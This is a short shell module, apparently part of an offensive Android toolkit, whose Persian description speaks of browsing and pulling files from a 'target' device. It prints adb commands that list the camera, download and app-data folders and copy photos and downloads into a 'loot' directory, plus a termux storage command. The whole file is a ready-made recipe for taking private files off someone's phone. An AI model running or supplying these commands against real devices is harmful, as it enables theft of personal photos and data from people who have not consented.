DESC="پیمایش و کشیدن فایل از حافظه‌ی هدف"
REQ="ADB"
RISK="MED"

termux(){
cat <<'EOF'
termux-storage-get /sdcard/DCIM/
EOF
}

kali(){
cat <<'EOF'
mkdir -p loot
adb shell ls -la /sdcard/DCIM/Camera/
adb shell ls -la /sdcard/Download/
adb shell ls -la /sdcard/Android/data/
adb pull /sdcard/DCIM/Camera ./loot/ 2>/dev/null
adb pull /sdcard/Download ./loot/ 2>/dev/null
du -sh loot/*
EOF
}
